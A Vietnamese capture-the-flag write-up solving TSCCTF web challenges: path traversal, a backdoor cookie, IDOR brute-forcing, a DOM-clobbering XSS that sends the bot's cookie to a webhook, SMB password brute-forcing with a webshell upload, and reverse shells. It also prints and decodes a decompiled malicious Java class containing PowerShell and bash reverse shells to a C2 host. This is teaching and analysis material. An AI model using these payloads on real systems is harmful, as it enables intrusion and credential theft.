---
title: "TSC CTF Web Security challenges"
description: "Writeups for web challenges"
categories: ["Writeups"]
tags: ["Web", "Digital Forensics"]
date: 2025-07-21
draft: false
cover: /images/posts_cover/tscctf.png
math: true
---

# TSCCTF Web-Security challenges writeup
> Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/H1C4VzUDkx.png)

Giải này thì mình cùng với f4n_n3r0 đạt được top 25/509, do giải này kh có For nên mình đành đấm web 🥲, enjoy my writeup.

## Ave Mujica
![image](https://hackmd.io/_uploads/BkniNfLDye.png)

>Description:
> …ようこそ。Ave Mujica の世界へ
...歡迎來到 Ave Mujica 的世界。
...Welcome to the world of Ave Mujica.

http://172.31.3.2:168/

![Screenshot_2025-01-16_121138_optimized_1000](https://hackmd.io/_uploads/BkP5rM8Pkx.png)

Thoạt đầu nhìn vào thì chỉ là 1 site front-end, k có chức năng gì ngoài ngắm hình mấy con nhỏ anime, mình check source xem có gì.

![image](https://hackmd.io/_uploads/r1feLGID1e.png)

Hmm ở /image với parameter ?name= mình có thể tải file logo về, vậy nếu mình không chọn tải file logo về thì sao, mình sẽ thử 1 chút path traversal ở đây.
![image](https://hackmd.io/_uploads/H1J5UGLvyl.png)

Bingooo!! Giờ đọc flag thôi, nhưng vấn đề là mình không biết file flag nằm ở đâu, vậy nên phải tìm source của server đọc trước, server đang dùng gunicorn, 1 framework của python, nên khả năng cao source sẽ có đuôi .py, nhưng mình thử với main.py, app.py, server.py,...etc thì lại không thấy gì cả, xem thử qua biến môi trường xem liệu flag có nằm ở đó không:

![image](https://hackmd.io/_uploads/ryRmwMLw1l.png)

Có biến `FLAG` nhưng hình như nó đã bị encode bằng 1 phương thức nào đó. Tiếp theo mình sẽ xem xem câu lệnh nào đã thực thi chương trình này:
![image](https://hackmd.io/_uploads/Bk6jwzIwyx.png)

```/usr/local/bin/python3.12/usr/local/bin/gunicorn -b 0.0.0.0:80bangdream:app```

Có thể thấy, server được khởi tạo ở port 80 thông qua bangdream trong thư mục app, vậy source chắc chắn nằm ở /app/bangdream.py rồi
![image](https://hackmd.io/_uploads/BJJX_MIvJe.png)

Bingoo hehe
```python
from flask import Flask, request, send_file, render_template
import os
import io
app = Flask(__name__)
FLAG = os.environ.get("FLAG")
if FLAG == None:
    FLAG = "TSC{dummy}"

@app.route('/', methods=["GET"])
def main():
    return render_template("index.html")


@app.route('/image', methods=["GET"])
def image():
    name = request.args.get("name")
    if not name:
        return "The file has MyGOed"
    try:
        f = open("./imgs/"+name, 'rb').read()
        return send_file(io.BytesIO(f), as_attachment=True, download_name=name)
    except OSError as e:
        print(e, flush=True)
        return "The file has MyGOed"
    
@app.route('/nande_haruhikage_yatta_no', methods=["GET"])
def flag():
    return FLAG

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

giờ chỉ cần truy cập đến `/nande_haruhikage_yatta_no` với phương thức GET là có được flag
![image](https://hackmd.io/_uploads/Hkxd_GLvkl.png)

`Flag: TSC{敬愛爽🍷}`

## Be_IDol

![image](https://hackmd.io/_uploads/SkX3uM8v1g.png)
> Description:
資安監測系統在新年假期期間發現系統異常活動，需緊急調查。
Detail:
不知道哪來的壞駭客，不好好遵守休假停戰協議，到底誰會在過年的時候亂打別人的機器？
還把系統負擔搞到過大，跳警訊害我需要來檢查這東西。
看起來好像被打穿了，似乎有些壞壞的文件混在裡面?
文件系統存取記錄異常，卻沒有在日常掃描中發現明顯漏洞...
已知資訊：
系統類型：內部文件管理系統
目前系統仍正常運作中
Note:
我看美秀看到一半ㄟ(

http://172.31.0.2:8057/

![image](https://hackmd.io/_uploads/rJbZtzLDyx.png)

Truy cập vào trang web cho mình 1 form login, thử sqli nhưng k được, đọc source thì phát hiện điểm thú vị:
![image](https://hackmd.io/_uploads/S1LDtz8Pke.png)

Chỉnh cookie PHPSESSID lại thành `secretbackdoor123` là login được rùi :>
![image](https://hackmd.io/_uploads/SkbnYMLvJl.png)

Sau khi login thành công thì mình vào được trang file explorer với chức năng tải file dựa vào id.
![image](https://hackmd.io/_uploads/HkK15G8wJg.png)

Dựa vào tên đề, mình có thể confirm trang web này đang bị dính lỗi IDOR (Insecure Direct Object Reference) một lỗi dựa trên việc tham chiếu trực tiếp đến đối tượng mà không kiểm tra quyền truy cập. Lỗi này cho phép kẻ tấn công truy cập hoặc chỉnh sửa dữ liệu mà họ không được phép, chỉ bằng cách thay đổi tham số trong URL hoặc request. Nhưng hiện tại mình chỉ biết có 1000 file trong đây vậy nên mình sẽ bruteforce thử từ 0 tới 10^5 xem còn file nào khác nữa không. Mình sẽ dùng intruder của Burp Suite Pro (bản community chậm quá TvT) để brute.
![image](https://hackmd.io/_uploads/rygBnfIDkg.png)

Với §§ là vị trí cần brute, payload thì chỉ cần paste 1 đoạn từ 0 đến 10^5 là được rùi, attack type mình dùng Sniper
![image](https://hackmd.io/_uploads/rJPt2f8wye.png)
![image](https://hackmd.io/_uploads/S1p3nM8vJe.png)

Giờ thì rung đùi ngồi chờ thoi :>

![image](https://hackmd.io/_uploads/r1Avym8D1g.png)

Sau khi ngủ 1 giấc thì mình thấy ở file_id=12001 có 1 cái gọi là System Command Interface, truy cập vào xem thử:
![image](https://hackmd.io/_uploads/By96yX8Pkl.png)

Woah mình có thể thực thi lệnh trên này, nhưng mình k biết vị trí của flag.txt nằm ở đâu cả, nên mình sẽ dùng reverse shell để tiện cho việc tìm kiếm

![image](https://hackmd.io/_uploads/rJ9YgQUv1g.png)
okay có shell r, nâng cấp lên python shell đã
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image](https://hackmd.io/_uploads/SylP-QUvye.png)

ra file flag ròi, cat flag thôi là xong :> 

`Flag: TSC{You_can_be_ID0R_12353oujhefrgiuoewihoqweihfo}`
## Book

Đây là bài mình đánh giá là khoai nhất trong toàn bộ các bài mình đã làm, vì nó là kỹ thuật mới nên mình phải research nhiều...

![image](https://hackmd.io/_uploads/r1oVMXUD1e.png)

> Description:
> Just a book site, you can create your own boook and share it to admin!

http://172.31.3.2:8000

Đề cung cấp cho mình source code và 1 trang có chức năng tạo book với title và content, phân tích source code trước, source code có 2 file app.js và bot.js nên khả năng cao bài này sẽ là 1 bài Stored XSS.

bot.js:
```javascript
const puppeteer = require("puppeteer");

const FLAG = process.env.FLAG || "TSC{fakeflag}";
const SITE_URL = process.env.SITE_URL || "http://book/";

const sleep = async (s) =>
  new Promise((resolve) => setTimeout(resolve, 1000 * s));

const visit = async (url) => {
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ["--disable-gpu", "--no-sandbox"],
      executablePath: "/usr/bin/chromium-browser",
    });
    const context = await browser.createIncognitoBrowserContext();

    // create flag cookie, you need to steal it!
    const page = await context.newPage();
    await sleep(1);
    await page.setCookie({ name: "flag", value: FLAG, domain: "book" });
    await sleep(1);
    await page.goto(url, { waitUntil: "networkidle0" });
    await sleep(5);
    await page.close();
  } catch (e) {
    console.log(e);
  } finally {
    if (browser) await browser.close();
  }
};

module.exports = visit;
```
con bot này mang cookie chứa flag, mình sẽ cần đánh cắp cookie từ con bot này.

main.py:
```python
from flask import Flask, request, render_template, redirect, url_for
import os
import re
import socket
import base64

app = Flask(__name__)
app.secret_key = os.urandom(32)

BOT_PORT = int(os.getenv("BOT_PORT", 8080))
BOT_HOST = os.getenv("BOT_HOST", "book-bot")
SITE_URL = os.getenv("SITE_URL", "http://book/")


@app.route("/", methods=["GET", "POST"])
def index():
    """Index page and create a new book"""
    if request.method == "POST":
        title = request.form.get("title", "")
        content = request.form.get("content", "")

        title_encoded = base64.b64encode(title.encode()).decode()
        content_encoded = base64.b64encode(content.encode()).decode()

        return redirect(url_for('view_book', title=title_encoded, content=content_encoded))

    return render_template("index.html")


@app.route("/book", methods=["GET"])
def view_book():
    """View a book"""
    return render_template("book.html")


@app.route("/report", methods=["GET", "POST"])
def report():
    """Just a report page for XSS chall"""
    response = None
    if request.method == "POST":
        url = request.form["url"]
        pattern = "^" + SITE_URL
        print(f"{pattern=}", flush=True)
        if not url or not re.match(pattern, url):
            return "Invalid URL", 400

        print(f"[+] Sending {url} to bot", flush=True)

        try:
            client = socket.create_connection((BOT_HOST, BOT_PORT))
            client.sendall(url.encode())

            response = []
            while True:
                data = client.recv(1024)
                if not data:
                    break
                response.append(data.decode())
            client.close()
            return "".join(response)
        except Exception as e:
            print(e, flush=True)
            return "Something is wrong...", 500
    return render_template("report.html", response=response)


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)
```

Những gì mình nhập vô title và content sẽ bị mã hoá bằng base64. Có 1 route report, điều kiện là phải bắt đầu với SITE_URL `(http://book/)`, sau khi report bot sẽ vào kiểm tra. Vậy mình sẽ phải xss, sau đó gửi link cho bot vào check, bot dính xss và đưa mình flag.
![image](https://hackmd.io/_uploads/Hk-qNQ8PJg.png)

Nhưng khi mình thử `<script>alert(1)</script>` thì lại không execute được, lý do nằm ở đâu, cùng xem qua book.html:
```javascript
            document.addEventListener("DOMContentLoaded", () => {
                const urlParams = new URLSearchParams(window.location.search);
                const title = atob(urlParams.get("title"));
                const content = atob(urlParams.get("content"));
                document.getElementById("title").innerHTML =
                    DOMPurify.sanitize(title);
                if (typeof config !== "undefined" && config.DEBUG) {
                    document.getElementById("content").innerHTML = content;
                } else {
                    document.getElementById("content").innerHTML =
                        DOMPurify.sanitize(content);
                }
            });
```

Nhận vào 2 giá trị là `title` và `content`, sau đó giải mã base64 bằng hàm `atob`, sau đó sanitize bằng DOMPurify để chống XSS, vậy làm sao để bypass được và thực thi XSS thành công đây ? Mình để ý thấy dòng code sau:
```javascript
if (typeof config !== "undefined" && config.DEBUG) {
                    document.getElementById("content").innerHTML = content;
```
Nếu typeof config !== "undefined" và config.DEBUG = true thì payload của mình sẽ không bị sanitize.

![image](https://hackmd.io/_uploads/S1XWI7UDyx.png)

Nhưng vấn đề là typeof config lúc nào cũng bị undefined, lý do là vì config chưa được khai báo như là 1 biến, vậy làm thế nào đây.

Theo Viblo:
> Khi một element được gán attribute id thì có thể truy cập được đến element đó qua window với name là id. Với tính chất của object window thì: id đó trở thành biến global gọi đến element kia.

Đại khái là khi mình khai báo `<div id="abc"></div` thì mình có thể truy cập đến `abc` với name là `id`.

![image](https://hackmd.io/_uploads/Sy-NtmIw1g.png)
Cre: Viblo Asia

Vậy làm thế nào để mình khai báo thằng config trong khi mình không có quyền chỉnh sửa code? Sau vài tiếng ngồi mày mò tìm hiểu, thì mình tìm ra được 1 kỹ thuật gọi là DOM Clobbering. Vậy DOM Clobbering là gì ?

Theo PortSwigger: 

> DOM Clobbering là một kỹ thuật inject HTML vào một trang để thao tác với DOM với mục địch cuối cùng là thay đổi hành vi của JavaScript trên trang. Kỹ thuật đặc biệt hữu ích trong trường hợp không thể thực hiện được XSS, nhưng có thể kiểm soát các HTML elements trên trang có thuộc tính id hoặc name sau khi được filter bằng whitelist. Thuật ngữ clobbering (ghi đè) xuất phát từ thực tế là việc "clobbering" một biến global hoặc thuộc tính của một đối tượng và thay vào đó ghi đè lên nó bằng DOM hoặc HTMLCollection.

Mình sẽ phải craft 1 payload mà payload đó ghi đè lên biến `config` trong phạm vi toàn cục, thêm thuộc tính `DEBUG`, qua đó bypass được typeof config !== "undefined" && config.DEBUG == true và execute được payload.

Sau 7749 giờ nghiên cứu, mình đã tìm ra được cách inject HTML để ghi đè biến `config`:
```javascript
<a id="config"></a><a id="config" name="DEBUG"></a>
```
`<a id="config"></a>`:

Tạo 1 element có tên là `config` với name là `id`, để ```typeof config !== "undefined"```

```<a id="config" name="DEBUG"></a>```

Thêm thuộc tính `DEBUG` vào cho element `config`, từ đó `config.DEBUG == true`

![image](https://hackmd.io/_uploads/Hk3n37Uw1x.png)

Như vậy inject thành công rồi, giờ thêm payload vào xem như nào

![image](https://hackmd.io/_uploads/BJEQp7Iwyg.png)

Boomm, giờ craft 1 payload khác fetch đến webhook và gửi cho con bot để lấy flag thôii.

![image](https://hackmd.io/_uploads/SJJnxNLD1l.png)

và mình đã có được flag :>
Final payload:
```javascript
<a id="config"></a><a id="config" name="DEBUG"><img src="x" onerror="fetch('<your_webhook_site>/?cookie='+document.cookie)"></a>
```

`Flag: flag=TSC{CLOBBERING_TIME!!!!!_ui2qjwu3wesixz}`

Tài liệu tham khảo: 
https://viblo.asia/p/tim-hieu-ve-dom-clobbering-obA46OYDJKv#_dom-clobbering-la-gi-no-duoc-su-dung-khi-nao-1
https://portswigger.net/web-security/dom-based/dom-clobbering

## A_BIG_BUG
![image](https://hackmd.io/_uploads/S1CV-VLDJg.png)

> Description:
> HI ctfuser
沒想到有一天你會闖到這裡
既然如此就該讓你看看一些刺激的東西
例如滲透測試、Penetration Test 還有 PT
先跟你說清楚一件事情
我說的話很重要
真的
回頭看看吧

Dựa vào dữ kiện được cung cấp, mình có được 1 vài thông tin sau:

username: ctfuser

Các dịch vụ đang hoạt động: http, smb

Tiến hành recon:
![image](https://hackmd.io/_uploads/rkzwyrIDJl.png)

Qua quá trình recon, mình biết được thêm http đang chạy trên server Apache/2.4.41 (Ubuntu), còn smb thì đang dùng Samba smbd 4.6.2, search google thì thấy Samba kể từ version 3.5.0 và trước 4.6.4, 4.5.10, 4.4.14 bị dính lỗi thực thi từ xa (RCE) thông qua việc upload thư viện độc hại. Có thể thấy có 1 folder uploads khi scan dir.

Attack plan:
-> Truy cập vào server smb
-> Upload shell
-> RCE và lấy flag

Mình đã có user là `ctfuser` rồi, chỉ cần bruteforce password là xong

Mình sẽ sử dụng metasploit để brute force tại kiếm hoài méo ra tool @@ 

![image](https://hackmd.io/_uploads/rkm-MSUPJe.png)

`search smb login` thì ra được module này, lụm thôi:

`show options`:
![image](https://hackmd.io/_uploads/ByxIGrUwkg.png)

cần set RHOSTS, RPORT, SMBUser, PASS_FILE là xong

![image](https://hackmd.io/_uploads/SycTzB8Pkg.png)

Bingoo, và mình đã có được password cho `ctfuser` là `123456`, login vào smb service thôi:

```smbclient //172.31.0.2/uploads -U ctfuser -p <ports>```
giờ thì upload shell lên thôi, shell mình lấy từ
https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php

upload file dùng lệnh put <tên_file_nguồn> <tên_file_đích>

![image](https://hackmd.io/_uploads/BkSiQrLv1g.png)
Bingoo, dùng reverse shell để tiện hơn trong việc tìm flag :> (nói thẳng ra là cho ngầu)

![image](https://hackmd.io/_uploads/H1dXNSLwkl.png)

```Flag: TSC{YOU_got_What_is_pt_and_low_security_password_4d9cf0ed1c9947f1aa6552923de42a61}```

## Additional: A Minecraft SOC Mission

![image](https://hackmd.io/_uploads/SJxcNBUvyg.png)

> Scenario:
Edward operates a massive Minecraft server hosting up to 100 players. One day, he discovers that a malicious backdoor program has been planted into the server. As a result, all critical data has been stolen without a trace.
As the SOC (Security Operations Center) boss, it’s your responsibility to investigate the incident. By analyzing the server logs, can you identify the root cause and find the Command and Control (C2) server’s IP address?
Objective:
Submit the identified C2 IP address as your answer ONLY

Tình huống: Edward host 1 server Mai cờ ráp với 100 mạng, tình cờ anh ấy phát hiện ra trong server được đặt 1 backdoor và mọi dữ liệu quan trọng đều không cánh mà bay, k để lại dấu vết. Nhiệm vụ của mình là phải identify được địa chỉ ip của server C2

Mình được cung cấp 2 file, 1 file class và 1 file log, mở file log lên xem trước:

![Screenshot_2025-01-16_153745_1_optimized_1000](https://hackmd.io/_uploads/BkSjBr8vyg.png)

Chỉ là log game thông thường thôi, không gì khả nghi cả, phân tích tiếp file Evil.class, vì đây là file chứa bytecode của 1 file java, nên phải có tool đặc biệt để decompile nó chứ k xem bằng mắt thường được, mình dùng http://www.javadecompilers.com/ để decompile.

Kết quả sau khi decompile:
```java
import java.util.Base64;

public class Evil extends ClassLoader {
   private static final String[] $ = new String[]{"QTlXNHY2eXVpPQ==", "WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ==", "ZEhOalpYUm1MbWh2YldVPQ=="};
   private static String = "k9";
   private static int = 1017;

   private void ᅠ(byte[] var1) {
      try {
         String[] var2 = (new String(Base64.getDecoder().decode($[1]))).split(",");
         new String(Base64.getDecoder().decode($[2]));
         String var4 = (String)Class.forName("java.lang.System").getMethod("getProperty", String.class).invoke((Object)null, var2[0]);
         boolean var5 = var4.toLowerCase().contains(var2[1]);
         String[] var10000;
         if (var5) {
            var10000 = new String[]{"cmd.exe", "/c", null};
            String var10003 = new String(new byte[]{112, 111, 119, 101, 114, 115, 104, 101, 108, 108, 32, 45, 101, 32});
            var10000[2] = var10003 + "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdABzAGMAYwB0AGYALgBoAG8AbQBlACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA";
         } else {
            var10000 = new String[]{"/bin/bash", "-c", this.ㅤㅤ(new String[]{"echo", "YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==", "base64", "-d", "bash"})};
         }

         String[] var6 = var10000;
         Class.forName("java.lang.Runtime").getMethod("exec", String[].class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke((Object)null), var6);
      } catch (Exception var7) {
      }

   }

   private String ㅤㅤ(String[] var1) {
      StringBuilder var2 = new StringBuilder();

      for(int var3 = 0; var3 < var1.length; ++var3) {
         var2.append(var1[var3]);
         if (var3 < var1.length - 1) {
            var2.append(" | ");
         }
      }

      return var2.toString();
   }

   static {
      (new Evil()).ᅠ(new byte[0]);
   }
}
```

Tổng quan đoạn code này sẽ check xem máy đang chạy đoạn script này là attacker hay victim thông qua `var5`, nếu `var5 == true` (script đang chạy ở máy attacker), thì sẽ mở một listener và tạo ra 1 reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("tscctf.home",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String
);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Còn nếu là máy victim (var5 == false) thì sẽ connect đến cổng reverse shell đang mở trên máy attacker:

``` java
var10000 = new String[]{"/bin/bash", "-c", this.ㅤㅤ(new String[]{"echo", "YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==", "base64", "-d", "bash"})};
```
`YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==: `
```bash
bash -i >& /dev/tcp/tscctf.home/443 0>&1
```

Qua đó có thể khẳng định, server C2 (Command & Control) ở đây là `tscctf.home`, đề yêu cầu nhập ip address, nhưng đ hiểu sao nhập domain vào thì lại nhận luôn @@

`Flag: tscctf.home`

Thanks you guys for reading til the end <3
